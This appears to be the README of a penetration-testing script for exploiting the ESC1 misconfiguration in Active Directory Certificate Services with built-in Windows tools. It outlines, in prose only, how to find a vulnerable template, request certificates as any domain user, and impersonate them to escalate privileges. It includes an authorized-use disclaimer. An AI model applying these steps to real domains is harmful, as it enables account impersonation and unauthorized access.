# ESC1_Build_In_Script

This script is designed to assist penetration testers and Red Teamers in conducting security assessments.

When operating in "live infrastructure," leveraging automation tools signed by native security and control mechanisms within Active Directory environments can introduce challenges, as these tools are tightly integrated with domain infrastructure.

In this guide, I will demonstrate how to exploit the ESC1 vulnerability in an Active Directory environment with Active Directory Certificate Services (ADCS). This will be achieved without relying on third-party tools, using only built-in Windows utilities.

The process includes:

Identifying a vulnerable certificate template configured with misconfigurations that allow unauthorized certificate enrollment.
Requesting a certificate on behalf of any user in the domain by exploiting the identified vulnerable template.
Utilizing the certificate for impersonation to escalate privileges or access restricted resources.
This demonstration highlights the importance of proper certificate template hardening and serves as a practical guide to understanding the risks associated with improperly secured ADCS implementations.

This guide is intended for authorized security assessments only. Unauthorized use or actions without proper consent may violate laws and regulations. Always ensure you have explicit permission before conducting such activities.

Enjoy learning and, most importantly, stay safe!
